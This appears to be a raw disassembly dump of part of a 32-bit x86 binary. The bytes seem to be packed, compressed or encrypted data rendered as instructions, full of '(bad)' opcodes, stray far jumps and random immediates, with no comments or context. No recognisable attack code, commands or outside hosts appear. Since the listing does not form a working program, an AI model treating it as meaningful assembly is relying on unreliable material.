  402f23:	clc    
  402f24:	add    BYTE PTR [esi],al
  402f26:	stc    
  402f27:	clc    
  402f28:	pusha  
  402f29:	add    cl,dh
  402f2b:	clc    
  402f2c:	add    BYTE PTR [eax-0x1c],ah
  402f2f:	clc    
  402f30:	add    eax,DWORD PTR [eax]
  402f32:	fdiv   st(0),st
  402f34:	add    BYTE PTR [ebx],al
  402f36:	mov    eax,0xb00030f8
  402f3b:	clc    
  402f3c:	add    BYTE PTR [eax],dh
  402f3e:	out    0xf8,al
  402f40:	or     al,0x0
  402f42:	fdivp  st(0),st
  402f44:	add    BYTE PTR [edx+edi*4],cl
  402f47:	clc    
  402f48:	rol    BYTE PTR [eax],0x64
  402f4b:	clc    
  402f4c:	(bad)  
  402f4d:	dec    DWORD PTR ds:0xd1103c9
  402f53:	retf   
  402f54:	add    eax,DWORD PTR [eax]
  402f56:	or     eax,0xd0703d1
  402f5b:	rol    BYTE PTR [ebx],1
  402f5d:	push   es
  402f5e:	or     eax,0x503e3
	...
  402f7f:	add    BYTE PTR ds:0xd0403e2,cl
  402f85:	aad    0x3
  402f87:	add    ecx,DWORD PTR ds:0xd0203dc
  402f8d:	out    0x3,eax
  402f8f:	add    DWORD PTR ds:0xd0003ae,ecx
  402f95:	fld    DWORD PTR [ebx]
  402f97:	add    BYTE PTR ds:0xc2071337,cl
  402f9d:	add    al,0x65
  402f9f:	push   cs
  402fa0:	xor    edx,DWORD PTR [ebx+0x34]
  402fa3:	or     DWORD PTR [eax+eax*1+0x5e0a6dc8],edx
  402faa:	xlat   BYTE PTR ds:[ebx]
  402fab:	push   0xffffff9d
  402fad:	stos   DWORD PTR es:[edi],eax
  402fae:	test   al,0x63
  402fb0:	xor    al,0x3a
  402fb2:	js     0x403018
  402fb4:	jnp    0x402f41
  402fb6:	jnp    0x402f93
  402fb8:	add    eax,DWORD PTR [ebp-0x75]
  402fbb:	fadd   QWORD PTR [edi+esi*4+0x60edd5dc]
  402fc2:	lods   al,BYTE PTR ds:[esi]
  402fc3:	shl    BYTE PTR [edx+0x4b63ff1],cl
  402fc9:	ins    BYTE PTR es:[edi],dx
  402fca:	dec    edi
  402fcb:	mov    cl,0x6b
  402fcd:	fisub  WORD PTR [eax]
  402fcf:	mov    eax,0xbef047ea
  402fd4:	jge    0x402f92
  402fd6:	repz mov dh,0xf0
  402fd9:	or     ah,BYTE PTR [ebx]
  402fdb:	mov    al,0x37
  402fdd:	mov    eax,ds:0xfebeb954
  402fe2:	inc    ebx
  402fe3:	mov    esi,0x0
	...
  403000:	add    BYTE PTR [eax],al
  403002:	xchg   ecx,eax
  403003:	jmp    DWORD PTR [ebx+0x11e9d7b7]
  403009:	out    0xc8,eax
  40300b:	pop    esp
  40300c:	mov    eax,0x26d3b998
  403011:	mov    BYTE PTR [esi+0x216b9f82],bh
  403017:	repz sub BYTE PTR [ebx-0x338c9c0a],bl
  40301e:	out    dx,eax
  40301f:	int3   
  403020:	std    
  403021:	mov    ebx,0x303679f0
  403026:	or     al,0xf4
  403028:	mov    edi,0x4a631360
  40302d:	movhlps xmm1,xmm2
  403030:	aam    0xff
  403032:	adc    bh,BYTE PTR [ebp-0x4f]
  403035:	and    al,0xe3
  403037:	or     bl,BYTE PTR [edi]
  403039:	hlt    
  40303a:	mov    ch,0x3b
  40303c:	int    0x43
  40303e:	lods   eax,DWORD PTR ds:[esi]
  40303f:	mov    ah,0x3b
  403041:	push   ebx
  403042:	mov    dl,0xa1
  403044:	mov    eax,0x260c0ee8
  403049:	mov    eax,0x87943b11
  40304e:	adc    BYTE PTR [edx-0x5af868fe],dh
  403054:	sbb    DWORD PTR [eax+ebx*2-0x4093f2ec],0x42
  40305c:	lahf   
  40305d:	mov    ebx,0xcb29a9c6
  403062:	mov    ecx,0x604a9c
	...
  403083:	add    ch,dl
  403085:	adc    dl,ah
  403087:	das    
  403088:	retf   0x2643
  40308b:	(bad)  
  40308c:	mov    eax,0xbc0eb0ac
  403091:	cdq    
  403092:	xchg   ebp,eax
  403093:	adc    al,0xb4
  403095:	add    eax,DWORD PTR es:[ebx+ebp*8]
  403099:	das    
  40309a:	add    BYTE PTR [ecx-0x2],ch
  40309d:	mov    ah,0xc8
  40309f:	xlat   BYTE PTR ds:[ebx]
  4030a0:	das    
  4030a1:	mov    al,0xbf
  4030a3:	pop    esp
  4030a4:	aad    0x94
  4030a6:	and    edx,ecx
  4030a8:	rcl    BYTE PTR [ecx-0x75e58faa],cl
  4030ae:	iret   
  4030af:	fidiv  WORD PTR [ebx-0x75]
  4030b2:	mov    eax,0x28028167
  4030b7:	icebp  
  4030b8:	push   es
  4030b9:	add    ebx,DWORD PTR [edi+0x3b]
  4030bc:	mov    dh,0xfc
  4030be:	vxorpd ymm7,ymm7,ymm1
  4030c2:	mov    al,0x6e
  4030c4:	ret    0x2f5c
  4030c7:	clc    
  4030c8:	sub    bl,BYTE PTR [eax+0x58]
  4030cb:	xor    BYTE PTR [ebx+0x60],0xc1
  4030cf:	or     al,0xfa
  4030d1:	gs mov dh,0x59
  4030d4:	iret   
  4030d5:	stos   DWORD PTR es:[edi],eax
  4030d6:	jbe    0x4030bf
  4030d8:	fild   QWORD PTR [eax-0x4e118aff]
  4030de:	cwde   
  4030df:	add    eax,DWORD PTR [ecx-0x4c]
  4030e2:	out    dx,eax
  4030e3:	jo     0x403070
  4030e5:	(bad)  
  4030e6:	jno    0x4030e6
	...
  403104:	add    BYTE PTR [eax],al
  403106:	adc    DWORD PTR [esi-0x72d5b3fa],0xffffff9f
  40310d:	fisub  DWORD PTR [edx-0x78]
  403110:	call   0x78458860
  403115:	mov    ch,0xd7
  403117:	dec    DWORD PTR [esi]
  403119:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40311b:	not    BYTE PTR [ebp-0x1f01992f]
  403121:	mov    ds:0xc7f56f3,al
  403126:	sbb    bl,BYTE PTR [ebx+0x8]
  403129:	jle    0x40316d
  40312b:	fs xchg ecx,eax
  40312d:	call   0x126925c
  403132:	adc    BYTE PTR [edx],dl
  403134:	imul   ebp,DWORD PTR [ebx-0x2a],0x61
  403138:	ins    BYTE PTR es:[edi],dx
  403139:	sbb    al,0x1c
  40313b:	icebp  
  40313c:	test   DWORD PTR fs:[edx+0x19f26200],ebx
  403143:	push   esi
  403144:	push   es
  403145:	ins    BYTE PTR es:[edi],dx
  403146:	outs   dx,DWORD PTR ds:[esi]
  403147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403148:	add    DWORD PTR [ebx],ebx
  40314a:	cmc    
  40314b:	mov    ah,0x8
  40314d:	and    BYTE PTR [ebx-0x3c],0xf
  403151:	cmc    
  403152:	loop   0x4030ed
  403154:	mov    al,0x65
  403156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403157:	test   eax,0x790e12b7
  40315c:	mov    esi,0xb948e88b
  403161:	cld    
  403162:	dec    ebx
  403163:	(bad)  
  403164:	fsub   QWORD PTR [edx+0x1d]
  403167:	out    0xd9,eax
  403169:	adc    eax,0x0
	...
  403186:	add    BYTE PTR [eax],al
  403188:	inc    edi
  403189:	aaa    
  40318a:	ror    DWORD PTR [ecx+edx*8+0x2cfbd407],cl
  403191:	arpl   WORD PTR [edx-0x4aed85b3],si
  403197:	cmp    al,BYTE PTR [eax]
  403199:	add    al,0xbc
  40319b:	mov    ds:0xd4baf346,eax
  4031a0:	in     eax,0x9e
  4031a2:	fisttp WORD PTR [edx+0x63]
  4031a5:	dec    esi
  4031a6:	fdivr  DWORD PTR ds:0xa4d1c009
  4031ac:	jg     0x40315d
  4031ae:	(bad)  
  4031af:	sar    esi,cl
  4031b1:	stos   BYTE PTR es:[edi],al
  4031b2:	imul   eax,DWORD PTR [ebx-0x78],0x32346e9d
  4031b9:	dec    esp
  4031ba:	lods   eax,DWORD PTR ds:[si]
  4031bc:	xchg   esp,eax
  4031bd:	jl     0x40321f
  4031bf:	fcmovbe st,st(7)
  4031c1:	call   0xd99175c9
  4031c6:	add    dh,BYTE PTR [ebx]
  4031c8:	or     eax,0xa70a3792
  4031cd:	and    BYTE PTR [eax+0xd],cl
  4031d0:	mov    al,0x5
  4031d2:	push   ebp
  4031d3:	add    eax,0x2456f5d
  4031d8:	jmp    0x2463:0x7b0af3a8
  4031df:	or     al,0xc4
  4031e1:	mov    esp,0x26426890
  4031e6:	sub    DWORD PTR [edi-0x13],0x66afdf
	...
  403209:	add    BYTE PTR [edx+ebx*2-0x20],dl
  40320d:	popa   
  40320e:	ret    
  40320f:	ror    esp,cl
  403211:	fsubp  st(3),st
  403213:	pusha  
  403214:	mov    ebp,0x6bb734d9
  403219:	sar    BYTE PTR [ebp+0x4ad79c15],1
  40321f:	retf   0xb308
  403222:	les    edx,FWORD PTR [edi-0x8]
  403225:	mov    bl,0x33
  403227:	out    dx,al
  403228:	daa    
  403229:	mov    ebp,0xba574ca2
  40322e:	dec    ebp
  40322f:	stc    
  403230:	xchg   BYTE PTR [eax-0x4069acc8],bh
  403236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403237:	in     eax,0xe5
  403239:	mov    dh,0xe
  40323b:	das    
  40323c:	mov    ch,0xb1
  40323e:	mov    ecx,0x37d542df
  403243:	cmp    dl,BYTE PTR [edx-0x2e]
  403246:	or     ah,0x21
  403249:	fist   DWORD PTR [ecx]
  40324b:	push   esi
  40324c:	icebp  
  40324d:	fistp  DWORD PTR [esi-0x119d015a]
  403253:	fs push cs
  403255:	fs cdq 
  403257:	xchg   edx,eax
  403258:	pop    ebp
  403259:	ins    DWORD PTR es:[edi],dx
  40325a:	or     BYTE PTR [ecx+0x2d],al
  40325d:	push   0x77
  40325f:	add    dl,dh
  403261:	mov    edx,0xca7ce41b
  403266:	adc    al,0x6f
  403268:	push   cs
  403269:	call   0x0:0x6997f60d
	...
  40328c:	or     cl,BYTE PTR [ebp-0x53]
  40328f:	jbe    0x4032ab
  403291:	rcr    BYTE PTR [ebx],1
  403293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403294:	adc    eax,0xcd5c183
  403299:	jmp    0x32c4:0x590bc52e
  4032a0:	das    
  4032a1:	shl    DWORD PTR [edx],cl
  4032a3:	bound  ebp,QWORD PTR [eax]
  4032a5:	sbb    BYTE PTR [eax+0x5e92911],0x1
  4032ac:	es pop edx
  4032ae:	jg     0x40329e
  4032b0:	pop    esi
  4032b1:	leave  
  4032b2:	or     DWORD PTR [esi],ebx
  4032b4:	pop    esi
  4032b5:	js     0x40324a
  4032b7:	dec    ebp
  4032b8:	push   edi
  4032b9:	out    dx,eax
  4032ba:	sbb    al,0x3d
  4032bc:	push   eax
  4032bd:	bound  edx,QWORD PTR [esi-0x57]
  4032c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032c1:	enter  0xd9e0,0xa3
  4032c5:	jns    0x4032f1
  4032c7:	mov    ah,BYTE PTR [edx-0x62854c0e]
  4032cd:	pop    edi
  4032ce:	shl    DWORD PTR [ebp+0x753fb163],1
  4032d4:	pop    esp
  4032d5:	mov    al,ds:0x755c6ad
  4032da:	sbb    edx,esi
  4032dc:	push   edx
  4032dd:	cmp    bl,BYTE PTR [eax+0x6b06661]
  4032e3:	xor    DWORD PTR [ecx-0x5f],esp
  4032e6:	mov    ah,0x2
  4032e8:	pusha  
  4032e9:	or     ah,BYTE PTR [edx]
  4032eb:	adc    bl,BYTE PTR [edi+0x37]
  4032ee:	mov    ds:0x1d,eax
	...
  40330b:	add    BYTE PTR [eax],al
  40330d:	add    BYTE PTR [eax],bl
  40330f:	test   al,0x2d
  403311:	in     eax,dx
  403312:	adc    al,0x99
  403314:	add    BYTE PTR [edi+0x3b],bh
  403317:	std    
  403318:	xor    eax,0x41044309
  40331d:	sub    al,ah
  40331f:	pusha  
  403320:	fbstp  TBYTE PTR [ebp+esi*4+0x5746a861]
  403327:	pop    edx
  403328:	xor    eax,edx
  40332a:	test   BYTE PTR [edi+0x46],dl
  40332d:	jne    0x4032cf
  40332f:	pop    edi
  403330:	retf   
  403331:	jecxz  0x4032bc
  403333:	bound  edi,QWORD PTR [ecx+ecx*4-0x8daa67d]
  40333a:	test   al,0x58
  40333c:	push   edx
  40333d:	jl     0x40337b
  40333f:	cld    
  403340:	retf   
  403341:	jmp    0xff9f:0x50baf54d
  403348:	and    DWORD PTR [esi+0x475502ec],edi
  40334e:	sbb    BYTE PTR [esi-0x737e2e3b],al
  403354:	mov    dl,0x5b
  403356:	sub    edx,DWORD PTR [ebx+ebp*1+0x5c8cd0e5]
  40335d:	mov    ss,WORD PTR [ebp-0x4f]
  403360:	ret    0xa418
  403363:	mov    al,0xb5
  403365:	(bad)  
  403366:	in     al,0xa6
  403368:	sub    al,0xec
  40336a:	je     0x403316
  40336c:	pop    ebx
  40336d:	jns    0x4033bf
  40336f:	fs fwait
  403371:	pop    es
	...
  40338e:	add    BYTE PTR [eax],al
  403390:	pop    ebx
  403391:	pop    ebp
  403392:	in     al,dx
  403393:	push   ebp
  403394:	jno    0x4033ec
  403396:	jne    0x40337b
  403398:	mov    ecx,0xc50025a
  40339d:	neg    DWORD PTR [ebx-0x15060322]
  4033a3:	ins    BYTE PTR es:[edi],dx
  4033a4:	lods   eax,DWORD PTR ds:[esi]
  4033a5:	add    BYTE PTR [edx-0x6],dh
  4033a8:	(bad)  
  4033aa:	add    al,0x0
  4033ac:	jbe    0x4033b9
  4033ae:	mov    edi,0xb83ad895
  4033b3:	loop   0x403407
  4033b5:	in     al,dx
  4033b6:	mov    al,0x7b
  4033b8:	mov    esp,0x8f0cb5db
  4033bd:	inc    esi
  4033be:	rcl    BYTE PTR [edx-0x1a2a890f],cl
  4033c4:	jnp    0x40336d
  4033c6:	fdivr  QWORD PTR [ebp+eax*1-0x69]
  4033ca:	fisttp DWORD PTR [ebx]
  4033cc:	sub    BYTE PTR [ebx-0x1d89792d],dl
  4033d2:	aam    0xf1
  4033d4:	cld    
  4033d5:	jae    0x4033b4
  4033d7:	push   0x1fda8372
  4033dc:	loope  0x4033ac
  4033de:	mov    ebp,0xb91ecf81
  4033e3:	test   BYTE PTR ds:0x7b6fb030,0x3f
  4033ea:	mov    bh,0x18
  4033ec:	sbb    bl,BYTE PTR [ebx]
  4033ee:	or     BYTE PTR [eax-0xf0d4fc],cl
	...
  403410:	add    BYTE PTR [eax],al
  403412:	cs cld 
  403414:	add    eax,0xcb8066
  403419:	adc    DWORD PTR [ebx+0x61],esi
  40341c:	gs (bad) 
  40341e:	mov    ebp,0x97f86271
  403423:	shr    BYTE PTR [ebx+0x61],0x29
  403427:	xchg   ecx,eax
  403428:	ins    BYTE PTR es:[edi],dx
  403429:	push   ss
  40342a:	int3   
  40342b:	fisttp QWORD PTR [edx]
  40342d:	mov    al,ds:0xd70d8d52
  403432:	sbb    BYTE PTR [ebp+0x4],bh
  403435:	dec    esi
  403436:	data16 ins BYTE PTR es:[edi],dx
  403438:	add    edi,DWORD PTR [ecx]
  40343a:	adc    eax,0x7ba766ea
  40343f:	fstp   DWORD PTR [edi-0x30]
  403442:	or     eax,0xc4693f24
  403447:	lea    ecx,[edi+0x6e]
  40344a:	dec    ebx
  40344b:	adc    ebx,DWORD PTR [edx-0x2f]
  40344e:	mov    bl,0x65
  403450:	sub    dl,dh
  403452:	aam    0xf7
  403454:	cli    
  403455:	fimul  WORD PTR [ebp+0x49]
  403458:	or     ebx,eax
  40345a:	and    cl,BYTE PTR [edx+0x1cb4bc95]
  403460:	mov    bx,0xaebb
  403464:	mov    dh,0xb2
  403466:	dec    edx
  403467:	inc    eax
  403468:	(bad)  
  403469:	mov    ch,0xfd
  40346b:	(bad)  
  40346d:	mov    ebp,0xbac25380
  403472:	(bad)  
  403473:	leave  
  403474:	jb     0x403429
	...
  403492:	add    BYTE PTR [eax],al
  403494:	pop    esi
  403495:	jg     0x40343a
  403497:	mov    ah,0xf1
  403499:	ror    DWORD PTR ds:0xfe4a67d0,cl
  40349f:	(bad)  
  4034a0:	enter  0x2ec0,0xde
  4034a4:	cmp    DWORD PTR [esi],esi
  4034a6:	pop    edi
  4034a7:	fldcw  WORD PTR [esi]
  4034a9:	scas   eax,DWORD PTR es:[edi]
  4034aa:	dec    ecx
  4034ab:	mov    si,0x3a41
  4034af:	popa   
  4034b0:	push   ecx
  4034b1:	fucomi st,st(2)
  4034b3:	shr    BYTE PTR [si],1
  4034b6:	sbb    ebp,DWORD PTR [edi+0x37]
  4034b9:	out    0x85,al
  4034bb:	or     ebx,DWORD PTR [ecx+0x4e0c7578]
  4034c1:	shl    BYTE PTR [esi-0x29dc48fb],cl
  4034c7:	add    bh,al
  4034c9:	fadd   DWORD PTR [ebx]
  4034cb:	add    BYTE PTR ds:0x141b1518,cl
  4034d1:	pop    ebx
  4034d2:	popa   
  4034d3:	call   FWORD PTR ss:[ecx-0x9d2ce]
  4034da:	in     al,dx
  4034db:	shl    BYTE PTR [ecx-0x5d2fdba5],0x44
  4034e2:	outs   dx,DWORD PTR ds:[esi]
  4034e3:	sahf   
  4034e4:	mov    bh,0x2d
  4034e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034e7:	ins    DWORD PTR es:[edi],dx
  4034e8:	dec    esp
  4034e9:	aaa    
  4034ea:	icebp  
  4034eb:	jns    0x4034d1
  4034ed:	mov    bh,0x30
  4034ef:	mov    ecx,edi
  4034f1:	mov    al,0x63
  4034f3:	fnclex 
  4034f5:	leave  
  4034f6:	mov    ds:0xac,al
	...
  403513:	add    BYTE PTR [eax],al
  403515:	add    cl,ah
  403517:	loop   0x40350e
  403519:	ss cwde 
  40351b:	xchg   ebx,eax
  40351c:	lods   al,BYTE PTR ds:[esi]
  40351d:	inc    ebp
  40351e:	stos   DWORD PTR es:[edi],eax
  40351f:	mov    WORD PTR [edi+0x18],fs
  403522:	mov    fs,WORD PTR [ebp+0x1e]
  403525:	out    0xa2,eax
  403527:	jle    0x4034c1
  403529:	icebp  
  40352a:	int3   
  40352b:	cmp    ecx,ebx
  40352d:	and    dl,ah
  40352f:	xor    bl,BYTE PTR [edx]
  403531:	push   ebx
  403532:	mov    ecx,0xba445b47
  403537:	pusha  
  403538:	mov    esp,0xf51573ae
  40353d:	frstor [eax+0xe]
  403540:	ds nop
  403542:	jne    0x403527
  403544:	jbe    0x4035c5
  403546:	mov    ?,esp
  403548:	lahf   
  403549:	imul   esp,DWORD PTR [esi],0xffffff82
  40354c:	loope  0x4034ea
  40354e:	or     eax,0x20c9126b
  403553:	nop
  403554:	push   ebx
  403555:	mov    edx,0x27449923
  40355a:	fcmovu st,st(5)
  40355c:	std    
  40355d:	push   edi
  40355e:	jmp    0xcc45ec29
  403563:	stos   DWORD PTR es:[edi],eax
  403564:	outs   dx,DWORD PTR ds:[esi]
  403565:	mul    ah
  403567:	mov    ah,0x8b
  403569:	and    BYTE PTR [ecx-0x64103594],cl
  40356f:	jae    0x403571
  403571:	or     ebx,esi
  403573:	xchg   ecx,eax
  403574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403575:	dec    eax
  403576:	fcomp  DWORD PTR [eax+0x4fbe]
	...
  403598:	xlat   BYTE PTR cs:[ebx]
  40359a:	icebp  
  40359b:	xchg   BYTE PTR [ecx-0x2e],ah
  40359e:	call   0xc3e5c370
  4035a3:	add    al,0x9f
  4035a5:	mov    ebx,0x239b53da
  4035aa:	pop    ebp
  4035ab:	xchg   edx,eax
  4035ac:	jo     0x4035ec
  4035ae:	inc    esp
  4035af:	sar    DWORD PTR [edx-0x2dff90a7],0x50
  4035b6:	jbe    0x40354f
  4035b8:	inc    esp
  4035b9:	(bad)  
  4035bb:	dec    esi
  4035bc:	daa    
  4035bd:	sbb    ah,BYTE PTR [eax]
  4035bf:	add    eax,0xbc0afed6
  4035c4:	push   ss
  4035c5:	in     al,0x11
  4035c7:	cmp    dl,BYTE PTR [ebx]
  4035c9:	fistp  QWORD PTR ds:[ebx-0x48]
  4035cd:	and    al,0xc6
  4035cf:	mov    eax,0xf9ed4fe2
  4035d4:	dec    ebx
  4035d5:	pop    ecx
  4035d6:	hlt    
  4035d7:	push   ds
  4035d8:	mov    esp,0xcf57bb1a
  4035dd:	cpuid  
  4035df:	pushf  
  4035e0:	pop    ds
  4035e1:	in     al,0x88
  4035e3:	aad    0xae
  4035e5:	std    
  4035e6:	pop    DWORD PTR [edx]
  4035e8:	xchg   ebp,eax
  4035e9:	gs pop ss
  4035eb:	inc    ebx
  4035ec:	add    bh,BYTE PTR [esi+ecx*1+0x70]
  4035f0:	test   al,0x97
  4035f2:	and    eax,0x3c9241b1
  4035f7:	out    0xd7,al
  4035f9:	shl    BYTE PTR [ebx-0x61],1
	...
  403618:	add    BYTE PTR [eax],al
  40361a:	push   ss
  40361b:	fsubr  DWORD PTR [edx+0x54]
  40361e:	fs mov esp,0xa6270d41
  403624:	pop    eax
  403625:	add    BYTE PTR [ecx],dh
  403627:	or     al,0x79
  403629:	lock lock cmp eax,0xeda3e962
  403630:	dec    esi
  403631:	ret    0xdd72
  403634:	push   ebx
  403635:	(bad)  ds:0xe4941547
  40363b:	jbe    0x40364b
  40363d:	lea    esp,[edi-0x4959dc58]
  403643:	cdq    
  403644:	cmp    BYTE PTR [edi+0x38a085f9],bh
  40364a:	sub    BYTE PTR [eax+0x646b21bb],dh
  403650:	xchg   esi,eax
  403651:	or     cl,BYTE PTR [edx-0x22ec72ae]
  403657:	add    ah,cl
  403659:	pop    esp
  40365a:	pushf  
  40365b:	icebp  
  40365c:	(bad)  
  40365d:	inc    ebp
  40365e:	outs   dx,DWORD PTR ds:[esi]
  40365f:	pop    edi
  403660:	cli    
  403661:	outs   dx,BYTE PTR ds:[esi]
  403662:	out    dx,al
  403663:	psraw  mm6,QWORD PTR [edi-0x60]
  403667:	sbb    eax,0x2ce1babb
  40366c:	mov    al,ds:0x8cfc12a3
  403671:	mov    BYTE PTR [ebx-0x35],al
  403674:	xchg   ebp,eax
  403675:	xchg   ecx,eax
  403676:	fs pop eax
  403678:	xlat   BYTE PTR ds:[ebx]
  403679:	ficom  WORD PTR [ebp+0xc7cc69]
	...
  40369b:	add    dh,dl
  40369d:	mov    dh,0xe1
  40369f:	in     al,dx
  4036a0:	pop    es
  4036a1:	mov    dl,bh
  4036a3:	cmc    
  4036a4:	test   al,0x93
  4036a6:	bound  esi,QWORD PTR [edx+0x59]
  4036a9:	mov    ds:0x761a6b79,al
  4036ae:	push   esp
  4036af:	inc    eax
  4036b0:	fild   DWORD PTR [edi+ecx*2+0x59]
  4036b4:	int3   
  4036b5:	in     eax,dx
  4036b6:	or     eax,0x14dd0d16
  4036bb:	prefetchwt1 BYTE PTR [ecx+0x51f13834]
  4036c2:	inc    ebp
  4036c3:	and    eax,DWORD PTR [eax]
  4036c5:	jbe    0x4036f6
  4036c7:	std    
  4036c8:	mov    al,0xbc
  4036ca:	pop    esi
  4036cb:	out    0xb1,al
  4036cd:	repz or al,0xcb
  4036d0:	ret    0xfc3a
  4036d3:	iret   
  4036d4:	sar    DWORD PTR [ecx],cl
  4036d6:	jb     0x403669
  4036d8:	or     al,0x79
  4036da:	mov    ds:0xcfb7f58a,eax
  4036df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e0:	ds stc 
  4036e2:	sar    BYTE PTR [edi+esi*1-0x57db5ad6],0x73
  4036ea:	aam    0x3f
  4036ec:	mov    ecx,0x8a1286bc
  4036f1:	lds    esi,FWORD PTR [ebp+0x9]
  4036f4:	mov    ebp,DWORD PTR [esi-0x18]
  4036f7:	inc    edi
  4036f8:	les    ebp,FWORD PTR [edi]
  4036fa:	sbb    DWORD PTR [ebx-0x43],edx
  4036fd:	add    BYTE PTR [edx+0x7e],cl
	...
  40371c:	add    BYTE PTR [eax],al
  40371e:	mov    cl,0x3a
  403721:	gs scas eax,DWORD PTR es:[edi]
  403723:	add    edi,DWORD PTR ds:0x4c49ea3f
  403729:	and    al,0xfb
  40372b:	test   BYTE PTR [esi],bl
  40372d:	or     DWORD PTR [eax],ecx
  40372f:	int3   
  403730:	in     eax,dx
  403731:	adc    DWORD PTR [ecx],ecx
  403733:	out    0x7f,eax
  403735:	push   ebx
  403736:	inc    esi
  403737:	es xchg ecx,eax
  403739:	dec    eax
  40373a:	aas    
  40373b:	imul   esp,ecx,0xb2a80465
  403741:	jle    0x403730
  403743:	cli    
  403744:	mov    dh,0xe6
  403746:	jb     0x40374a
  403748:	(bad)  
  403749:	std    
  40374a:	jae    0x403799
  40374c:	xchg   esp,eax
  40374d:	rol    BYTE PTR [eax-0x6c],1
  403750:	arpl   bx,cx
  403752:	push   ecx
  403753:	add    bl,ah
  403755:	stc    
  403756:	test   BYTE PTR [edi-0x5e],bh
  403759:	or     bh,BYTE PTR [esi+eiz*2+0x51]
  40375d:	pop    eax
  40375e:	mov    DWORD PTR [ecx-0x6795d6f0],edx
  403764:	xor    bl,BYTE PTR [esi+ecx*4-0x6a930cf9]
  40376b:	push   ds
  40376c:	mov    al,ds:0x60f960bd
  403771:	into   
  403772:	jae    0x403764
  403774:	xor    eax,0xef232a61
  403779:	das    
  40377a:	sbb    DWORD PTR [edx],edi
  40377c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40377d:	add    ah,ah
  40377f:	push   esp
  403780:	pop    ebp
  403781:	adc    DWORD PTR [eax],eax
	...
  40379f:	add    bh,cl
  4037a1:	dec    ebx
  4037a2:	sub    dl,BYTE PTR [esi]
  4037a4:	push   edi
  4037a5:	iret   
  4037a6:	jmp    0x40378e
  4037a8:	dec    ebp
  4037a9:	(bad)  
  4037aa:	test   al,0x33
  4037ac:	jns    0x40376f
  4037ae:	imul   eax,DWORD PTR [edx+ebx*2-0x58],0x6b23daae
  4037b6:	out    0xa9,eax
  4037b8:	and    BYTE PTR [edx+0x2c],dh
  4037bb:	js     0x4037ca
  4037bd:	popf   
  4037be:	xchg   DWORD PTR gs:[esi],esp
  4037c1:	test   bl,ah
  4037c3:	lea    ecx,[ecx+edx*2-0x5e]
  4037c7:	jle    0x403820
  4037c9:	pop    eax
  4037ca:	push   ecx
  4037cb:	stos   DWORD PTR es:[edi],eax
  4037cc:	and    bh,BYTE PTR [edi]
  4037ce:	adc    ah,bl
  4037d0:	xor    DWORD PTR [esi],esp
  4037d2:	pop    es
  4037d3:	push   ebx
  4037d4:	call   0xdb81f5c5
  4037d9:	repz je 0x4037cc
  4037dc:	daa    
  4037dd:	sbb    ebp,DWORD PTR [edi+ebx*1]
  4037e0:	or     eax,0x9503db02
  4037e5:	mov    BYTE PTR [edx+0x9f8ff4],bl
  4037eb:	pop    ecx
  4037ec:	xor    BYTE PTR [edx-0x7344e775],dl
  4037f2:	xchg   edx,eax
  4037f3:	call   DWORD PTR [ebx-0x35]
  4037f6:	fnsave [esi]
  4037f8:	xchg   ebp,eax
  4037f9:	rol    ah,cl
  4037fb:	jge    0x4037b1
  4037fd:	mov    ebp,0xa8a7b4ef
  403802:	not    al
	...
  403820:	add    BYTE PTR [eax],al
  403822:	(bad)  
  403823:	cli    
  403824:	lods   eax,DWORD PTR ds:[esi]
  403825:	xchg   ecx,eax
  403826:	and    bl,0xb6
  403829:	inc    edx
  40382a:	das    
  40382b:	adc    BYTE PTR [ebx+eax*1-0x6b7aeaa4],bl
  403832:	(bad)  
  403833:	push   esi
  403834:	retf   0xc14d
  403837:	dec    edi
  403838:	rol    DWORD PTR [esi],cl
  40383a:	sub    BYTE PTR [ebx],ah
  40383c:	clc    
  40383d:	mov    edi,0x88e13bf0
  403842:	mul    DWORD PTR [ebx-0x44fbb69a]
  403848:	jg     0x403854
  40384a:	inc    ebp
  40384b:	fcom   DWORD PTR [ebx+ecx*8+0x2b]
  40384f:	int    0x4d
  403851:	dec    esp
  403852:	mov    al,ds:0xcb85028e
  403857:	xchg   edi,eax
  403858:	sbb    ecx,esi
  40385a:	lahf   
  40385b:	jl     0x40388d
  40385d:	pop    es
  40385e:	sub    DWORD PTR [ecx+0x29],esp
  403861:	cmp    DWORD PTR [edi],0x6c40e4bb
  403867:	mov    ds:0xcddaf3fd,al
  40386c:	(bad)  
  40386d:	mov    dl,0x63
  40386f:	fmul   st,st(7)
  403871:	gs call 0x335cb90d
  403877:	mov    ds,WORD PTR [ecx-0x4d9ee829]
  40387d:	mov    es,WORD PTR [esi+0x3400ab7d]
  403883:	fcomp  DWORD PTR [ebx]
  403885:	sub    al,0x0
	...
  4038a3:	add    BYTE PTR [ebp-0x16],dh
  4038a6:	push   es
  4038a7:	xor    eax,0x1e2a37a6
  4038ac:	out    0x7,eax
  4038ae:	xor    DWORD PTR [edi],eax
  4038b0:	js     0x403850
  4038b2:	jo     0x4038fc
  4038b4:	cmp    DWORD PTR [ebp+0x7b2a516b],ebp
  4038ba:	inc    esi
  4038bb:	jp     0x403898
  4038bd:	dec    ecx
  4038be:	pop    ebp
  4038bf:	arpl   WORD PTR [edx],ax
  4038c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038c2:	cli    
  4038c3:	retf   
  4038c4:	and    edx,DWORD PTR [edi+0x4a70d2e1]
  4038ca:	int3   
  4038cb:	stc    
  4038cc:	sar    DWORD PTR [eax-0x29],0xe0
  4038d0:	fsubp  st(1),st
  4038d2:	xchg   ebp,eax
  4038d3:	scas   eax,DWORD PTR es:[edi]
  4038d4:	pop    ds
  4038d5:	fmul   QWORD PTR [esi+esi*4-0x625ff354]
  4038dc:	ins    DWORD PTR es:[edi],dx
  4038dd:	ds mov ebx,0x23212a84
  4038e3:	add    ebp,ebx
  4038e5:	adc    BYTE PTR [eax],bh
  4038e7:	sbb    bh,BYTE PTR [eax+0x693114ff]
  4038ed:	out    dx,eax
  4038ee:	or     eax,0x4f64a628
